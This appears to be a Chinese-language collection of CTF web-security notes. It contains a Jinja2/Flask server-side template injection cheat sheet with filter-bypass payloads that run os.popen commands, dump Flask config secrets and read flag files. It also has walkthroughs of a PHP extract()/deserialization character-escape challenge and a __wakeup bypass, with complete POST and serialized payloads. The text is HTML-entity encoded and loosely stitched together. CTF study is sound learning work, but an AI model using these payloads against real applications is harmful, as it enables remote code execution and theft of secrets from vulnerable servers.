&#123;&#123;&quot;&quot;[&quot;__class__&quot;][&quot;__bases__&quot;][0][&quot;__subclasses__&quot;]()&#125;&#125;

&#123;&#123;&quot;&quot;[&quot;__class__&quot;][&quot;__mro__&quot;][1][&quot;__subclasses__&quot;]()[199][&quot;__init__&quot;][&quot;__globals__&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;)[&quot;read&quot;]()&#125;&#125;

7. 绕过关键字过滤当特定关键字（如 class、base、mro 等）被过滤时，使用字符串拼接：
&#123;&#123;&quot;&quot;|attr(&quot;__cla&quot;+&quot;ss__&quot;)|attr(&quot;__ba&quot;+&quot;ses__&quot;)[0]&#125;&#125;

十六进制编码：
&#123;&#123;&quot;&quot;|attr(&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;)&#125;&#125;

base64编码配合eval：
&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__[&quot;__builtins__&quot;][&quot;eval&quot;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;

Jinja2 字符串拼接操作符：利用 Jinja2 特有的 ~ 符号进行字符串拼接：
&#123;%set a=&quot;__cla&quot;%&#125;&#123;%set b=&quot;ss__&quot;%&#125;&#123;&#123;a~b&#125;&#125;
完整示例：
&#123;%set a=&quot;__cla&quot;%&#125;&#123;%set b=&quot;ss__&quot;%&#125;&#123;&#123;&quot;&quot;|attr(a~b)|attr(&quot;__bases__&quot;)[0]&#125;&#125;

使用过滤器变形还原：利用模板引擎内置的过滤器将字符串变形后再恢复：
# reverse 过滤器反转字符串&#123;%set a=&quot;__ssalc__&quot;|reverse%&#125;&#123;&#123;a&#125;&#125;  # __ssalc__ 是 __class__ 的反写 &#123;%set a=&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;)%&#125;&#123;&#123;a&#125;&#125;  # __class__ 是 __claee__ 的变形# 完整利用示例&#123;%set cls=&quot;__ssalc__&quot;|reverse%&#125;&#123;&#123;&quot;&quot;|attr(cls)|attr(&quot;__bases__&quot;)&#125;&#125;&#123;%set a=&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;)%&#125;&#123;&#123;&quot;&quot;|attr(a)|attr(&quot;__bases__&quot;)&#125;&#125;
利用 Python 内置 chr() 函数：通过 chr() 函数用 ASCII 码生成字符：
# 获取 chr 函数&#123;%set chr=url_for.__globals__[&#x27;__builtins__&#x27;].chr%&#125;&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;

8. Length过滤器绕过数字过滤当数字被过滤时，利用 |length 过滤器生成数字：
# 生成数字 1&#123;%set a=(dict(a=1)|length)%&#125;# 生成数字 2&#123;%set b=(dict(a=1,b=1)|length)%&#125;# 以此类推，通过拼接不同数量的字典键来生成任意数字

利用字符串长度：
&#123;%set one=(dict(a=1)|length)%&#125;           # 1&#123;%set two=(dict(a=1,b=1)|length)%&#125;        # 2&#123;%set three=(dict(a=1,b=1,c=1)|length)%&#125;  # 3

组合数字：
&#123;%set one=(dict(a=1)|length)%&#125;&#123;%set zero=(self|length)%&#125;               # 当self长度为0时&#123;%set ten=(one~zero)|int%&#125;               # 字符串拼接后再转int得到10
9. 获取config文件相关内容除了直接使用 &#123;config&#125;&#125; 外，还有其他方式获取 Flask 配置：
通过self获取config：
&#123;&#123;self.__init__.__globals__[&quot;current_app&quot;].config&#125;&#125;

通过get_flashed_messages获取：
&#123;&#123;get_flashed_messages.__globals__[&quot;current_app&quot;].config&#125;&#125;

通过url_for获取：
&#123;&#123;url_for.__globals__[&quot;current_app&quot;].config&#125;&#125;

遍历config中的敏感信息：
&#123;&#123;config.__dict__&#125;&#125;

&#123;%for k,v in config.items()%&#125;&#123;%k&#125;&#125;:&#123;%v&#125;&#123;%endfor%&#125;

通过__init__获取全局变量中的config：
&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[65].__init__.__globals__[&quot;current_app&quot;].config&#125;&#125;
11关用内置open函数读取文件&#123;%set a=dict(config=1)|join%&#125;&#123;%set b=dict(__class__=1)|join%&#125;&#123;%set c=dict(__init__=1)|join%&#125;&#123;%set d=dict(__globals__=1)|join%&#125;              &#123;%set i=dict(__getitem__=1)|join%&#125;&#123;%set e=dict(__builtins__=1)|join%&#125;&#123;%set f=dict(open=1)|join%&#125;&#123;%set g=dict(flag=1)|join%&#125;&#123;%set h=dict(read=1)|join%&#125;&#123;&#123;config|attr(b)|attr(c)|attr(d)|attr(i)(e)|attr(i)(f)(g)|attr(h)()&#125;&#125;
构造空格执行cat flag&#123;%set a=dict(config=1)|join%&#125;&#123;%set b=dict(__class__=1)|join%&#125;&#123;%set c=dict(__init__=1)|join%&#125;&#123;%set d=dict(__globals__=1)|join%&#125;&#123;%set i=dict(__getitem__=1)|join%&#125;&#123;%set kg=lipsum|string|attr(i)(9)%&#125;#构造空格&#123;%set l=dict(cat=1)|join%&#125;&#123;%set m=dict(flag=1)|join%&#125;&#123;%set o=l~kg~m%&#125;&#123;%set e=dict(os=1)|join%&#125;&#123;%set f=dict(popen=1)|join%&#125;&#123;%set h=dict(read=1)|join%&#125;&#123;&#123;config|attr(b)|attr(c)|attr(d)|attr(i)(e)|attr(f)(o)|attr(h)()&#125;&#125;

1 题目描述打开题目页面，只有一个 “source_code” 链接，点击可以看到源代码。 2 代码审计访问 ?f=highlight_file 获取源代码： &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;, &#x27;flag&#x27;, &#x27;php5&#x27;, &#x27;php4&#x27;, &#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;, $filter_arr).&#x27;/i&#x27;; return preg_replace($filter, &#x27;&#x27;, $img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST); // 变量覆盖漏洞！if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125;?&gt;
关键函数分析1. filter() 过滤函数 过滤关键字：php、flag、php5、php4、fl1g，使用 preg_replace 将它们替换为空字符串。 2. extract($_POST) 变量覆盖 extract() 函数将 POST 数组中的键值对提取为 PHP 变量，这意味着可以通过 POST 覆盖前面的 $_SESSION[&#39;user&#39;]、$_SESSION[&#39;function&#39;]变量。 3. show_image 功能 当 $function == &#39;show_image&#39; 时，会反序列化经过 filter 处理的 session 数据，然后读取 $userinfo[&#39;img&#39;] base64 解码后的文件路径。 3 信息收集 — phpinfo访问 ?f=phpinfo，在 phpinfo 页面中发现关键信息：
auto_append_file: d0g3_f1ag.php — 存在可疑 PHP 文件 FLAG: not_flag — 不是真正的 flag
由此可知 flag 很可能就在 d0g3_f1ag.php 文件中。 4 反序列化字符逃逸原理核心漏洞点filter() 函数会对 serialize($_SESSION) 的序列化字符串进行关键字过滤，而过滤后的字符串会被 unserialize() 反序列化。 当 filter 删除了序列化字符串中的字符，但长度标识（s:N）没有相应更新时，就会导致反序列化解析错位，从而实现字符逃逸。 三种 POST 方式实现逃逸参考文章中给出了三种 POST 传参方式，均可以实现字符逃逸，可对比学习规律： 方法一：利用键名 flagflag _SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot; 序列化后：a:1:{s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;}&quot;，filter 删除两个 “flag” 后键名变为空，s:8 向后吞并，注入的 img 键值对被解析。 方法二：利用键名 flagphp _SESSION[flagphp]=;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot; filter 删除 “php,flag” 后键名变化，同样造成逃逸。 5 构造 Payload 获取 Flag第一步：读取 d0g3_f1ag.phpd0g3_f1ag.php 的 base64 编码： d0g3_f1ag.php -&gt; base64_encode = ZDBnM19mMWFnLnBocA==
构造 payload，利用 extract($_POST) 覆盖 $_SESSION[&#39;user&#39;]、$_SESSION[&#39;function&#39;]变量和使后面的 $_SESSION[&#39;img&#39;]变量逃逸： 通过字符逃逸，原本代码中设置的 img 值（guest_img.png 的 base64或sha1(base64_encode($_GET[&#39;img_path&#39;]))）被忽略，注入的 ZDBnM19mMWFnLnBocA== 成为了 img 的值。 发送请求： GET /index.php?f=show_imagePOST: _SESSION[flagphp] =;s:3:&quot;666&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
查看返回结果页面源代码： &lt;?php$flag = &#x27;flag in /d0g3_fllllllag&#x27;;?&gt;
成功读取到 d0g3_f1ag.php 文件！其中提示 flag 在 /d0g3_fllllllag 文件中。 第二步：读取 &#x2F;d0g3_fllllllag 获取 Flag/d0g3_fllllllag 的 base64 编码： /d0g3_fllllllag -&gt; base64_encode = L2QwZzNfZmxsbGxsbGFn
构造相同结构的 payload，只替换 base64 字符串： GET /index.php?f=show_imagePOST: _SESSION[flagphp] =;s:3:&quot;666&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;
最终获取 flag： 6 知识点总结 extract() 变量覆盖 — 通过 POST 数据覆盖 $_SESSION、$function、$_GET 等变量 反序列化字符逃逸 — 利用 filter 删除关键字导致的序列化字符串长度与内容不匹配，实现反序列化注入 PHP 反序列化容错性 — PHP 反序列化时能自动跳过无效字符继续解析，这为注入提供了可能
字符逃逸的通用思路当序列化字符串经过替换&#x2F;过滤操作后，长度发生变化时：
替换后变短(本题)：利用长度标识 &gt; 实际内容，向后吞并其他字段 替换后变长：利用转义字符导致闭合提前

进入题目，就有页面提示“所以我有一个良好的备份网站的习惯”,是所以网站可能存在网站源码备份
常见的网站源码备份文件后缀:tar.gz，zip，rar，tar常见的网站源码备份文件名：web，website，backup，back，www，wwwroot，temp

一个个组合尝试后,发现www.zip可以成功获得网站源码备份下载有4个文件
访问一下index.php文件：&lt;?php    include &#x27;class.php&#x27;;    $select = $_GET[&#x27;select&#x27;];    $res=unserialize(@$select);    ?&gt;
发现文件包含 class.php 文件 并且文件是get  传参，参数为 select访问class.php文件：&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123;    private $username = &#x27;nonono&#x27;;    private $password = &#x27;yesyes&#x27;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#x27;guest&#x27;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#x27;admin&#x27;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;            die();                    &#125;    &#125;&#125;?&gt;
发现php文件中包含 flag.php并且 设置两个私有变量 ，利用 __construct 构造函数  来进行一个一一对应的关系之后__wakeup() 让 username 变量等于 guest在类 结束的时候，调用__desctruct()函数 ，如果这个 password不等于100 ，就会输出 username…,password… ，退出函数。如果 username&#x3D; admin 就会输出 flag 否则 失败。在本题的关键，就是username的赋值 因为 __wakeup 会对userneme进行一次赋值，所以要想办法绕过该函数， 并且在一开始要给username的赋值为admin
当成员属性数目大于实际数目时可绕过wakeup方法

构造payload&lt;?phpclass Name&#123;    private $username = &#x27;admine&#x27;;    private $password = &#x27;100&#x27;;    &#125; $select = new Name(); $res=serialize(@$select);    echo $res?&gt;
得到序列化字符串
O:4:”Name”:2:{s:14:”口Name口username”;s:6:”admine”;s:14:”口Name口password”;s:3:”100”;}

将空字符替换为%00
O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}

